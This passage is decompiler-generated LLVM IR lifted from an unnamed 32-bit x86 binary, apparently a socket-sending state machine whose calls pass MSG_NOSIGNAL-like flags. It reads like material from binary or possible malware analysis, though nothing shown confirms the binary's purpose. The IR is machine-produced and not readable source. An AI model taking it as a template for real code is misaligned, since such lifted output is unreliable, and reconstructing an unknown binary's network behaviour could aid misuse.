  store i32 %v2_8050cdb, i32* %eax.global-to-local, align 4
  %v3_8050cdb = add i32 %v0_8050cdb, 4
  %v1_8050cdc = inttoptr i32 %v3_8050cdb to i32*
  %v2_8050cdc = load i32, i32* %v1_8050cdc, align 4
  store i32 %v2_8050cdc, i32* %edx.global-to-local, align 4
  %v1_8050cdd = add i32 %v0_8050cdb, 1888
  store i32 %v1_8050cdd, i32* %eax.global-to-local, align 4
  store i32 %v1_8050cdd, i32* %v1_8050cdc, align 4
  store i32 22, i32* %v1_8050cdb, align 4
  %v3_8050ce7 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050ce7, i32* %eax.global-to-local, align 4
  %v0_8050cec = load i32, i32* @esp, align 4
  %v1_8050cec = add i32 %v0_8050cec, -4
  %v2_8050cec = inttoptr i32 %v1_8050cec to i32*
  store i32 16384, i32* %v2_8050cec, align 4
  %v1_8050cf1 = add i32 %v0_8050cec, 1888
  %v2_8050cf1 = inttoptr i32 %v1_8050cf1 to i32*
  %v3_8050cf1 = load i32, i32* %v2_8050cf1, align 4
  store i32 %v3_8050cf1, i32* @esi, align 4
  %v2_8050cf8 = add i32 %v0_8050cec, -8
  %v3_8050cf8 = inttoptr i32 %v2_8050cf8 to i32*
  store i32 %v3_8050cf1, i32* %v3_8050cf8, align 4
  %v2_8050cf9 = add i32 %v0_8050cec, -12
  %v3_8050cf9 = inttoptr i32 %v2_8050cf9 to i32*
  store i32 %v3_8050ce7, i32* %v3_8050cf9, align 4
  %v0_8050cfa = load i32, i32* @edi, align 4
  %v1_8050cfa = add i32 %v0_8050cfa, 4
  %v2_8050cfa = inttoptr i32 %v1_8050cfa to i32*
  %v3_8050cfa = load i32, i32* %v2_8050cfa, align 4
  store i32 %v3_8050cfa, i32* @ebx, align 4
  %v2_8050cfd = add i32 %v0_8050cec, -16
  %v3_8050cfd = inttoptr i32 %v2_8050cfd to i32*
  store i32 %v3_8050cfa, i32* %v3_8050cfd, align 4
  %v0_8050cfe = call i32 @function_8052984()
  store i32 %v0_8050cfe, i32* %eax.global-to-local, align 4
  %v0_8050d03 = load i32, i32* @esp, align 4
  %v1_8050d06 = add i32 %v0_8050d03, 28
  %v2_8050d06 = inttoptr i32 %v1_8050d06 to i32*
  store i32 16384, i32* %v2_8050d06, align 4
  %v1_8050d0b = add i32 %v0_8050d03, 24
  %v2_8050d0b = inttoptr i32 %v1_8050d0b to i32*
  store i32 2, i32* %v2_8050d0b, align 4
  %v1_8050d0d = add i32 %v0_8050d03, 20
  %v2_8050d0d = inttoptr i32 %v1_8050d0d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050d0d, align 4
  %v0_8050d12 = load i32, i32* @edi, align 4
  %v1_8050d12 = add i32 %v0_8050d12, 4
  %v2_8050d12 = inttoptr i32 %v1_8050d12 to i32*
  %v3_8050d12 = load i32, i32* %v2_8050d12, align 4
  store i32 %v3_8050d12, i32* %ecx.global-to-local, align 4
  %v2_8050d15 = add i32 %v0_8050d03, 16
  %v3_8050d15 = inttoptr i32 %v2_8050d15 to i32*
  store i32 %v3_8050d12, i32* %v3_8050d15, align 4
  %v0_8050d16 = call i32 @function_8052984()
  store i32 %v0_8050d16, i32* %eax.global-to-local, align 4
  %v0_8050d1b = load i32, i32* @esp, align 4
  %v1_8050d1b = inttoptr i32 %v0_8050d1b to i32*
  store i32 22, i32* %v1_8050d1b, align 4
  %v2_8050d22 = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d22, i32* %eax.global-to-local, align 4
  %v0_8050d2a = load i32, i32* @edi, align 4
  %v1_8050d2a = add i32 %v0_8050d2a, 12
  %v2_8050d2a = inttoptr i32 %v1_8050d2a to i32*
  store i32 7, i32* %v2_8050d2a, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050d36:                             ; preds = %dec_label_pc_8050ab7, %dec_label_pc_8050aae, %dec_label_pc_8050aa5, %dec_label_pc_8050a9c, %dec_label_pc_8050a8f
  %v1_8050d36 = add i32 %v0_8050d36, 1
  store i32 %v1_8050d36, i32* @ebp, align 4
  %v10_8050d39 = icmp eq i32 %v0_8050d36, -2
  br i1 %v10_8050d39, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050d42

dec_label_pc_8050d42:                             ; preds = %dec_label_pc_8050d36
  %tmp151 = icmp slt i32 %v1_8050d36, 1
  br i1 %tmp151, label %dec_label_pc_8050ad3, label %dec_label_pc_8050d4a

dec_label_pc_8050d4a:                             ; preds = %dec_label_pc_8050d42
  %v0_8050d4a = load i32, i32* @esp, align 4
  %v1_8050d4d = add i32 %v0_8050d4a, -16
  %v2_8050d4d = inttoptr i32 %v1_8050d4d to i32*
  store i32 24, i32* %v2_8050d4d, align 4
  %v2_8050d4f = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d4f, i32* %eax.global-to-local, align 4
  %v0_8050d54 = load i32, i32* @esp, align 4
  %v1_8050d54 = inttoptr i32 %v0_8050d54 to i32*
  %v2_8050d54 = load i32, i32* %v1_8050d54, align 4
  store i32 %v2_8050d54, i32* %eax.global-to-local, align 4
  %v3_8050d54 = add i32 %v0_8050d54, 4
  %v1_8050d55 = inttoptr i32 %v3_8050d54 to i32*
  %v1_8050d56 = add i32 %v0_8050d54, 1880
  store i32 %v1_8050d56, i32* %edx.global-to-local, align 4
  store i32 %v1_8050d56, i32* %v1_8050d55, align 4
  store i32 24, i32* %v1_8050d54, align 4
  %v3_8050d60 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050d60, i32* %eax.global-to-local, align 4
  %v0_8050d65 = load i32, i32* @esp, align 4
  %v1_8050d65 = add i32 %v0_8050d65, -4
  %v2_8050d65 = inttoptr i32 %v1_8050d65 to i32*
  store i32 16384, i32* %v2_8050d65, align 4
  %v1_8050d6a = add i32 %v0_8050d65, 1880
  %v2_8050d6a = inttoptr i32 %v1_8050d6a to i32*
  %v3_8050d6a = load i32, i32* %v2_8050d6a, align 4
  store i32 %v3_8050d6a, i32* @esi, align 4
  %v2_8050d71 = add i32 %v0_8050d65, -8
  %v3_8050d71 = inttoptr i32 %v2_8050d71 to i32*
  store i32 %v3_8050d6a, i32* %v3_8050d71, align 4
  %v2_8050d72 = add i32 %v0_8050d65, -12
  %v3_8050d72 = inttoptr i32 %v2_8050d72 to i32*
  store i32 %v3_8050d60, i32* %v3_8050d72, align 4
  %v0_8050d73 = load i32, i32* @edi, align 4
  %v1_8050d73 = add i32 %v0_8050d73, 4
  %v2_8050d73 = inttoptr i32 %v1_8050d73 to i32*
  %v3_8050d73 = load i32, i32* %v2_8050d73, align 4
  store i32 %v3_8050d73, i32* @ebx, align 4
  %v2_8050d76 = add i32 %v0_8050d65, -16
  %v3_8050d76 = inttoptr i32 %v2_8050d76 to i32*
  store i32 %v3_8050d73, i32* %v3_8050d76, align 4
  %v0_8050d77 = call i32 @function_8052984()
  store i32 %v0_8050d77, i32* %eax.global-to-local, align 4
  %v0_8050d7c = load i32, i32* @esp, align 4
  %v1_8050d7f = add i32 %v0_8050d7c, 28
  %v2_8050d7f = inttoptr i32 %v1_8050d7f to i32*
  store i32 16384, i32* %v2_8050d7f, align 4
  %v1_8050d84 = add i32 %v0_8050d7c, 24
  %v2_8050d84 = inttoptr i32 %v1_8050d84 to i32*
  store i32 2, i32* %v2_8050d84, align 4
  %v1_8050d86 = add i32 %v0_8050d7c, 20
  %v2_8050d86 = inttoptr i32 %v1_8050d86 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050d86, align 4
  %v0_8050d8b = load i32, i32* @edi, align 4
  %v1_8050d8b = add i32 %v0_8050d8b, 4
  %v2_8050d8b = inttoptr i32 %v1_8050d8b to i32*
  %v3_8050d8b = load i32, i32* %v2_8050d8b, align 4
  store i32 %v3_8050d8b, i32* %ecx.global-to-local, align 4
  %v2_8050d8e = add i32 %v0_8050d7c, 16
  %v3_8050d8e = inttoptr i32 %v2_8050d8e to i32*
  store i32 %v3_8050d8b, i32* %v3_8050d8e, align 4
  %v0_8050d8f = call i32 @function_8052984()
  store i32 %v0_8050d8f, i32* %eax.global-to-local, align 4
  %v0_8050d94 = load i32, i32* @esp, align 4
  %v1_8050d94 = inttoptr i32 %v0_8050d94 to i32*
  store i32 24, i32* %v1_8050d94, align 4
  %v2_8050d9b = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d9b, i32* %eax.global-to-local, align 4
  %v0_8050da3 = load i32, i32* @edi, align 4
  %v1_8050da3 = add i32 %v0_8050da3, 12
  %v2_8050da3 = inttoptr i32 %v1_8050da3 to i32*
  store i32 10, i32* %v2_8050da3, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050daf:                             ; preds = %dec_label_pc_8050864, %dec_label_pc_805085b, %dec_label_pc_8050852, %dec_label_pc_8050849, %dec_label_pc_805083c
  %v1_8050daf = add i32 %v0_8050daf, 1
  store i32 %v1_8050daf, i32* @ebp, align 4
  %v10_8050db2 = icmp eq i32 %v0_8050daf, -2
  br i1 %v10_8050db2, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050dbb

dec_label_pc_8050dbb:                             ; preds = %dec_label_pc_8050daf
  %tmp152 = icmp slt i32 %v1_8050daf, 1
  br i1 %tmp152, label %dec_label_pc_8050ad3, label %dec_label_pc_8050dc3

dec_label_pc_8050dc3:                             ; preds = %dec_label_pc_8050dbb
  %v0_8050dc3 = load i32, i32* @esp, align 4
  %v1_8050dc6 = add i32 %v0_8050dc3, -16
  %v2_8050dc6 = inttoptr i32 %v1_8050dc6 to i32*
  store i32 23, i32* %v2_8050dc6, align 4
  %v2_8050dc8 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050dc8, i32* %eax.global-to-local, align 4
  %v0_8050dcd = load i32, i32* @esp, align 4
  %v1_8050dcd = inttoptr i32 %v0_8050dcd to i32*
  %v2_8050dcd = load i32, i32* %v1_8050dcd, align 4
  store i32 %v2_8050dcd, i32* %eax.global-to-local, align 4
  %v3_8050dcd = add i32 %v0_8050dcd, 4
  %v1_8050dce = inttoptr i32 %v3_8050dcd to i32*
  %v2_8050dce = load i32, i32* %v1_8050dce, align 4
  store i32 %v2_8050dce, i32* %edx.global-to-local, align 4
  %v1_8050dcf = add i32 %v0_8050dcd, 1880
  store i32 %v1_8050dcf, i32* %eax.global-to-local, align 4
  store i32 %v1_8050dcf, i32* %v1_8050dce, align 4
  store i32 23, i32* %v1_8050dcd, align 4
  %v3_8050dd9 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050dd9, i32* %eax.global-to-local, align 4
  %v0_8050dde = load i32, i32* @esp, align 4
  %v1_8050dde = add i32 %v0_8050dde, -4
  %v2_8050dde = inttoptr i32 %v1_8050dde to i32*
  store i32 16384, i32* %v2_8050dde, align 4
  %v1_8050de3 = add i32 %v0_8050dde, 1880
  %v2_8050de3 = inttoptr i32 %v1_8050de3 to i32*
  %v3_8050de3 = load i32, i32* %v2_8050de3, align 4
  store i32 %v3_8050de3, i32* @esi, align 4
  %v2_8050dea = add i32 %v0_8050dde, -8
  %v3_8050dea = inttoptr i32 %v2_8050dea to i32*
  store i32 %v3_8050de3, i32* %v3_8050dea, align 4
  %v2_8050deb = add i32 %v0_8050dde, -12
  %v3_8050deb = inttoptr i32 %v2_8050deb to i32*
  store i32 %v3_8050dd9, i32* %v3_8050deb, align 4
  %v0_8050dec = load i32, i32* @edi, align 4
  %v1_8050dec = add i32 %v0_8050dec, 4
  %v2_8050dec = inttoptr i32 %v1_8050dec to i32*
  %v3_8050dec = load i32, i32* %v2_8050dec, align 4
  store i32 %v3_8050dec, i32* @ebx, align 4
  %v2_8050def = add i32 %v0_8050dde, -16
  %v3_8050def = inttoptr i32 %v2_8050def to i32*
  store i32 %v3_8050dec, i32* %v3_8050def, align 4
  %v0_8050df0 = call i32 @function_8052984()
  store i32 %v0_8050df0, i32* %eax.global-to-local, align 4
  %v0_8050df5 = load i32, i32* @esp, align 4
  %v1_8050df8 = add i32 %v0_8050df5, 28
  %v2_8050df8 = inttoptr i32 %v1_8050df8 to i32*
  store i32 16384, i32* %v2_8050df8, align 4
  %v1_8050dfd = add i32 %v0_8050df5, 24
  %v2_8050dfd = inttoptr i32 %v1_8050dfd to i32*
  store i32 2, i32* %v2_8050dfd, align 4
  %v1_8050dff = add i32 %v0_8050df5, 20
  %v2_8050dff = inttoptr i32 %v1_8050dff to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050dff, align 4
  %v0_8050e04 = load i32, i32* @edi, align 4
  %v1_8050e04 = add i32 %v0_8050e04, 4
  %v2_8050e04 = inttoptr i32 %v1_8050e04 to i32*
  %v3_8050e04 = load i32, i32* %v2_8050e04, align 4
  store i32 %v3_8050e04, i32* %ecx.global-to-local, align 4
  %v2_8050e07 = add i32 %v0_8050df5, 16
  %v3_8050e07 = inttoptr i32 %v2_8050e07 to i32*
  store i32 %v3_8050e04, i32* %v3_8050e07, align 4
  %v0_8050e08 = call i32 @function_8052984()
  store i32 %v0_8050e08, i32* %eax.global-to-local, align 4
  %v0_8050e0d = load i32, i32* @esp, align 4
  %v1_8050e0d = inttoptr i32 %v0_8050e0d to i32*
  store i32 23, i32* %v1_8050e0d, align 4
  %v2_8050e14 = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e14, i32* %eax.global-to-local, align 4
  %v0_8050e1c = load i32, i32* @edi, align 4
  %v1_8050e1c = add i32 %v0_8050e1c, 12
  %v2_8050e1c = inttoptr i32 %v1_8050e1c to i32*
  store i32 9, i32* %v2_8050e1c, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050e28:                             ; preds = %dec_label_pc_805062c, %dec_label_pc_8050623, %dec_label_pc_805061a, %dec_label_pc_8050611, %dec_label_pc_8050604
  %v1_8050e28 = add i32 %v0_8050e28, 1
  store i32 %v1_8050e28, i32* @ebp, align 4
  %v10_8050e2b = icmp eq i32 %v0_8050e28, -2
  br i1 %v10_8050e2b, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050e34

dec_label_pc_8050e34:                             ; preds = %dec_label_pc_8050e28
  %tmp153 = icmp slt i32 %v1_8050e28, 1
  br i1 %tmp153, label %dec_label_pc_8050ad3, label %dec_label_pc_8050e3c

dec_label_pc_8050e3c:                             ; preds = %dec_label_pc_8050e34
  %v0_8050e3c = load i32, i32* @esp, align 4
  %v1_8050e3f = add i32 %v0_8050e3c, -16
  %v2_8050e3f = inttoptr i32 %v1_8050e3f to i32*
  store i32 21, i32* %v2_8050e3f, align 4
  %v2_8050e41 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e41, i32* %eax.global-to-local, align 4
  %v0_8050e46 = load i32, i32* @esp, align 4
  %v1_8050e46 = inttoptr i32 %v0_8050e46 to i32*
  %v2_8050e46 = load i32, i32* %v1_8050e46, align 4
  store i32 %v2_8050e46, i32* %eax.global-to-local, align 4
  %v3_8050e46 = add i32 %v0_8050e46, 4
  %v1_8050e47 = inttoptr i32 %v3_8050e46 to i32*
  %v2_8050e47 = load i32, i32* %v1_8050e47, align 4
  store i32 %v2_8050e47, i32* %edx.global-to-local, align 4
  %v1_8050e48 = add i32 %v0_8050e46, 1880
  store i32 %v1_8050e48, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050e48, i32* %v1_8050e47, align 4
  store i32 21, i32* %v1_8050e46, align 4
  %v3_8050e52 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050e52, i32* %eax.global-to-local, align 4
  %v0_8050e57 = load i32, i32* @esp, align 4
  %v1_8050e57 = add i32 %v0_8050e57, -4
  %v2_8050e57 = inttoptr i32 %v1_8050e57 to i32*
  store i32 16384, i32* %v2_8050e57, align 4
  %v1_8050e5c = add i32 %v0_8050e57, 1880
  %v2_8050e5c = inttoptr i32 %v1_8050e5c to i32*
  %v3_8050e5c = load i32, i32* %v2_8050e5c, align 4
  store i32 %v3_8050e5c, i32* @esi, align 4
  %v2_8050e63 = add i32 %v0_8050e57, -8
  %v3_8050e63 = inttoptr i32 %v2_8050e63 to i32*
  store i32 %v3_8050e5c, i32* %v3_8050e63, align 4
  %v2_8050e64 = add i32 %v0_8050e57, -12
  %v3_8050e64 = inttoptr i32 %v2_8050e64 to i32*
  store i32 %v3_8050e52, i32* %v3_8050e64, align 4
  %v0_8050e65 = load i32, i32* @edi, align 4
  %v1_8050e65 = add i32 %v0_8050e65, 4
  %v2_8050e65 = inttoptr i32 %v1_8050e65 to i32*
  %v3_8050e65 = load i32, i32* %v2_8050e65, align 4
  store i32 %v3_8050e65, i32* @ebx, align 4
  %v2_8050e68 = add i32 %v0_8050e57, -16
  %v3_8050e68 = inttoptr i32 %v2_8050e68 to i32*
  store i32 %v3_8050e65, i32* %v3_8050e68, align 4
  %v0_8050e69 = call i32 @function_8052984()
  store i32 %v0_8050e69, i32* %eax.global-to-local, align 4
  %v0_8050e6e = load i32, i32* @esp, align 4
  %v1_8050e71 = add i32 %v0_8050e6e, 28
  %v2_8050e71 = inttoptr i32 %v1_8050e71 to i32*
  store i32 16384, i32* %v2_8050e71, align 4
  %v1_8050e76 = add i32 %v0_8050e6e, 24
  %v2_8050e76 = inttoptr i32 %v1_8050e76 to i32*
  store i32 2, i32* %v2_8050e76, align 4
  %v1_8050e78 = add i32 %v0_8050e6e, 20
  %v2_8050e78 = inttoptr i32 %v1_8050e78 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050e78, align 4
  %v0_8050e7d = load i32, i32* @edi, align 4
  %v1_8050e7d = add i32 %v0_8050e7d, 4
  %v2_8050e7d = inttoptr i32 %v1_8050e7d to i32*
  %v3_8050e7d = load i32, i32* %v2_8050e7d, align 4
  store i32 %v3_8050e7d, i32* %ecx.global-to-local, align 4
  %v2_8050e80 = add i32 %v0_8050e6e, 16
  %v3_8050e80 = inttoptr i32 %v2_8050e80 to i32*
  store i32 %v3_8050e7d, i32* %v3_8050e80, align 4
  %v0_8050e81 = call i32 @function_8052984()
  store i32 %v0_8050e81, i32* %eax.global-to-local, align 4
  %v0_8050e86 = load i32, i32* @esp, align 4
  %v1_8050e86 = inttoptr i32 %v0_8050e86 to i32*
  store i32 21, i32* %v1_8050e86, align 4
  %v2_8050e8d = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e8d, i32* %eax.global-to-local, align 4
  %v0_8050e95 = load i32, i32* @edi, align 4
  %v1_8050e95 = add i32 %v0_8050e95, 12
  %v2_8050e95 = inttoptr i32 %v1_8050e95 to i32*
  store i32 6, i32* %v2_8050e95, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050ea1:                             ; preds = %dec_label_pc_80508c0
  %v2_8050eab = load i32, i32* %v1_8050eab, align 4
  store i32 %v2_8050eab, i32* %eax.global-to-local, align 4
  %v0_8050eac = load i32, i32* @edi, align 4
  %v1_8050eac = add i32 %v0_8050eac, 4
  %v2_8050eac = inttoptr i32 %v1_8050eac to i32*
  %v3_8050eac = load i32, i32* %v2_8050eac, align 4
  store i32 %v3_8050eac, i32* %eax.global-to-local, align 4
  store i32 %v3_8050eac, i32* %v1_8050eab, align 4
  %v1_8050eb0 = call i32 @function_8052241(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050eb0, i32* %eax.global-to-local, align 4
  %v0_8050eb5 = load i32, i32* @edi, align 4
  %v1_8050eb5 = add i32 %v0_8050eb5, 284
  %v2_8050eb5 = inttoptr i32 %v1_8050eb5 to i8*
  %v3_8050eb5 = load i8, i8* %v2_8050eb5, align 1
  %v4_8050eb5 = zext i8 %v3_8050eb5 to i32
  %v6_8050eb5 = and i32 %v1_8050eb0, -256
  %v7_8050eb5 = or i32 %v4_8050eb5, %v6_8050eb5
  %v1_8050ebe = add i32 %v7_8050eb5, 1
  store i32 %v1_8050ebe, i32* %eax.global-to-local, align 4
  %v1_8050ebf = add i32 %v0_8050eb5, 4
  %v2_8050ebf = inttoptr i32 %v1_8050ebf to i32*
  store i32 -1, i32* %v2_8050ebf, align 4
  %v0_8050ec6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ec6 = trunc i32 %v0_8050ec6 to i8
  %v2_8050ec6 = load i32, i32* @edi, align 4
  %v3_8050ec6 = add i32 %v2_8050ec6, 284
  %v4_8050ec6 = inttoptr i32 %v3_8050ec6 to i8*
  store i8 %v1_8050ec6, i8* %v4_8050ec6, align 1
  %v0_8050ecc = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ecc = trunc i32 %v0_8050ecc to i8
  %v10_8050ecc = icmp eq i8 %v1_8050ecc, 10
  %v1_8050ece = icmp eq i1 %v10_8050ecc, false
  br i1 %v1_8050ece, label %dec_label_pc_8051060, label %dec_label_pc_8050ed4

dec_label_pc_8050ed4:                             ; preds = %dec_label_pc_8050ea1
  store i32 -1, i32* @ebp, align 4
  %v0_8050ed7 = load i32, i32* @edi, align 4
  %v1_8050ed7 = add i32 %v0_8050ed7, 284
  %v2_8050ed7 = inttoptr i32 %v1_8050ed7 to i8*
  store i8 0, i8* %v2_8050ed7, align 1
  %v0_8050ede = load i32, i32* @edi, align 4
  %v1_8050ede = add i32 %v0_8050ede, 12
  %v2_8050ede = inttoptr i32 %v1_8050ede to i32*
  store i32 0, i32* %v2_8050ede, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050eea:                             ; preds = %dec_label_pc_8050b54
  %v1_8050eea = add i32 %v0_8050b40, -4
  %v2_8050eea = inttoptr i32 %v1_8050eea to i32*
  store i32 16384, i32* %v2_8050eea, align 4
  %v1_8050eef = add i32 %v0_8050b40, -8
  %v2_8050eef = inttoptr i32 %v1_8050eef to i32*
  store i32 3, i32* %v2_8050eef, align 4
  %v1_8050ef1 = add i32 %v0_8050b40, 1879
  store i32 %v1_8050ef1, i32* %eax.global-to-local, align 4
  %v0_8050ef8 = load i32, i32* @ebx, align 4
  %v1_8050ef8 = add i32 %v0_8050ef8, 3
  store i32 %v1_8050ef8, i32* @ebx, align 4
  %v2_8050efb = add i32 %v0_8050b40, -12
  %v3_8050efb = inttoptr i32 %v2_8050efb to i32*
  store i32 %v1_8050ef1, i32* %v3_8050efb, align 4
  %v0_8050efc = load i32, i32* @ebp, align 4
  %v1_8050efc = add i32 %v0_8050efc, 3
  store i32 %v1_8050efc, i32* @ebp, align 4
  %v0_8050eff = load i32, i32* @edi, align 4
  %v1_8050eff = add i32 %v0_8050eff, 4
  %v2_8050eff = inttoptr i32 %v1_8050eff to i32*
  %v3_8050eff = load i32, i32* %v2_8050eff, align 4
  store i32 %v3_8050eff, i32* @esi, align 4
  %v2_8050f02 = add i32 %v0_8050b40, -16
  %v3_8050f02 = inttoptr i32 %v2_8050f02 to i32*
  store i32 %v3_8050eff, i32* %v3_8050f02, align 4
  %v0_8050f03 = call i32 @function_8052984()
  %v0_8050f08 = load i32, i32* @esp, align 4
  %v1_8050f08 = add i32 %v0_8050f08, -4
  %v2_8050f08 = inttoptr i32 %v1_8050f08 to i32*
  store i32 16384, i32* %v2_8050f08, align 4
  %v1_8050f0d = add i32 %v0_8050f08, -8
  %v2_8050f0d = inttoptr i32 %v1_8050f0d to i32*
  store i32 9, i32* %v2_8050f0d, align 4
  %v1_8050f0f = add i32 %v0_8050f08, 1863
  store i32 %v1_8050f0f, i32* %eax.global-to-local, align 4
  %v2_8050f16 = add i32 %v0_8050f08, -12
  %v3_8050f16 = inttoptr i32 %v2_8050f16 to i32*
  store i32 %v1_8050f0f, i32* %v3_8050f16, align 4
  %v0_8050f17 = load i32, i32* @edi, align 4
  %v1_8050f17 = add i32 %v0_8050f17, 4
  %v2_8050f17 = inttoptr i32 %v1_8050f17 to i32*
  %v3_8050f17 = load i32, i32* %v2_8050f17, align 4
  store i32 %v3_8050f17, i32* %ecx.global-to-local, align 4
  %v2_8050f1a = add i32 %v0_8050f08, -16
  %v3_8050f1a = inttoptr i32 %v2_8050f1a to i32*
  store i32 %v3_8050f17, i32* %v3_8050f1a, align 4
  %v0_8050f1b = call i32 @function_8052984()
  store i32 %v0_8050f1b, i32* %eax.global-to-local, align 4
  %v0_8050f20 = load i32, i32* @esp, align 4
  %v1_8050f20 = add i32 %v0_8050f20, 32
  %v0_8050f23 = load i32, i32* @edi, align 4
  %v1_8050f23 = add i32 %v0_8050f23, 24
  %v2_8050f23 = inttoptr i32 %v1_8050f23 to i32*
  %v3_8050f23 = load i32, i32* %v2_8050f23, align 4
  store i32 %v3_8050f23, i32* %edx.global-to-local, align 4
  %v0_80506c3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80506c3.backedge

dec_label_pc_8050f2b:                             ; preds = %dec_label_pc_80505ad
  %v1_8050f2b = add i32 %v0_80505b7, 1872
  %v2_8050f2b = inttoptr i32 %v1_8050f2b to i32*
  store i32 0, i32* %v2_8050f2b, align 4
  %v0_8050f36 = load i32, i32* @esp, align 4
  %v1_8050f36 = add i32 %v0_8050f36, 1864
  %v2_8050f36 = inttoptr i32 %v1_8050f36 to i32*
  store i32 4, i32* %v2_8050f36, align 4
  %v0_8050f41 = load i32, i32* @esp, align 4
  %v1_8050f44 = add i32 %v0_8050f41, 1864
  %v2_8050f4b = add i32 %v0_8050f41, -16
  %v3_8050f4b = inttoptr i32 %v2_8050f4b to i32*
  store i32 %v1_8050f44, i32* %v3_8050f4b, align 4
  %v1_8050f4c = add i32 %v0_8050f41, 1872
  store i32 %v1_8050f4c, i32* %eax.global-to-local, align 4
  %v2_8050f53 = add i32 %v0_8050f41, -20
  %v3_8050f53 = inttoptr i32 %v2_8050f53 to i32*
  store i32 %v1_8050f4c, i32* %v3_8050f53, align 4
  %v1_8050f54 = add i32 %v0_8050f41, -24
  %v2_8050f54 = inttoptr i32 %v1_8050f54 to i32*
  store i32 4, i32* %v2_8050f54, align 4
  %v1_8050f56 = add i32 %v0_8050f41, -28
  %v2_8050f56 = inttoptr i32 %v1_8050f56 to i32*
  store i32 1, i32* %v2_8050f56, align 4
  %v0_8050f58 = load i32, i32* @edi, align 4
  %v1_8050f58 = add i32 %v0_8050f58, 4
  %v2_8050f58 = inttoptr i32 %v1_8050f58 to i32*
  %v3_8050f58 = load i32, i32* %v2_8050f58, align 4
  store i32 %v3_8050f58, i32* %eax.global-to-local, align 4
  %v2_8050f5b = add i32 %v0_8050f41, -32
  %v3_8050f5b = inttoptr i32 %v2_8050f5b to i32*
  store i32 %v3_8050f58, i32* %v3_8050f5b, align 4
  %v0_8050f5c = call i32 @function_80528b0()
  store i32 %v0_8050f5c, i32* %eax.global-to-local, align 4
  %v0_8050f61 = load i32, i32* @esp, align 4
  %v2_8050f64 = add i32 %v0_8050f61, 1904
  %v3_8050f64 = inttoptr i32 %v2_8050f64 to i32*
  %v4_8050f64 = load i32, i32* %v3_8050f64, align 4
  %v5_8050f64 = or i32 %v4_8050f64, %v0_8050f5c
  %v6_8050f64 = icmp eq i32 %v5_8050f64, 0
  store i32 %v5_8050f64, i32* %eax.global-to-local, align 4
  %v1_8050f6b = icmp eq i1 %v6_8050f64, false
  br i1 %v1_8050f6b, label %dec_label_pc_8050fcc, label %dec_label_pc_8050f6d

dec_label_pc_8050f6d:                             ; preds = %dec_label_pc_8050f2b
  %v0_8050f6d = load i32, i32* @edi, align 4
  %v1_8050f6d = add i32 %v0_8050f6d, 12
  %v2_8050f6d = inttoptr i32 %v1_8050f6d to i32*
  store i32 2, i32* %v2_8050f6d, align 4
  %v1_8050f74 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_8050f74 = sext i32 %v1_8050f74 to i64
  %v0_8050f79 = load i16, i16* @global_var_805698c.49, align 4
  %v1_8050f79 = zext i16 %v0_8050f79 to i32
  %v0_8050f86 = load i32, i32* @global_var_8056958.50, align 8
  store i32 %v0_8050f86, i32* @ebx, align 4
  store i32 %v1_8050f79, i32* %ecx.global-to-local, align 4
  %v8_8050f90 = zext i16 %v0_8050f79 to i64
  %v9_8050f90 = udiv i64 %v2_8050f74, %v8_8050f90
  %v10_8050f90 = trunc i64 %v9_8050f90 to i32
  store i32 %v10_8050f90, i32* %eax.global-to-local, align 4
  %v11_8050f90 = urem i64 %v2_8050f74, %v8_8050f90
  %v12_8050f90 = trunc i64 %v11_8050f90 to i32
  store i32 %v12_8050f90, i32* %edx.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_8050f86, 1
  br i1 %tmp154, label %dec_label_pc_8051091, label %dec_label_pc_8050f9a

dec_label_pc_8050f9a:                             ; preds = %dec_label_pc_8050f6d
  %v0_8050f9a = load i32, i32* @global_var_8056988.51, align 8
  store i32 %v0_8050f9a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8050faf = trunc i64 %v11_8050f90 to i16
  br label %dec_label_pc_8050faf

dec_label_pc_8050fa3:                             ; preds = %dec_label_pc_8050fb5, %dec_label_pc_8050faf
  %v1_8050fa3 = add i32 %v0_8050fa3, 1
  store i32 %v1_8050fa3, i32* %ecx.global-to-local, align 4
  %v1_8050fa4 = add i32 %v0_8050fa4, 16
  store i32 %v1_8050fa4, i32* %eax.global-to-local, align 4
  %v12_8050fa7 = icmp eq i32 %v1_8050fa3, %v0_8050f86
  br i1 %v12_8050fa7, label %dec_label_pc_8051091.loopexit, label %dec_label_pc_8050faf

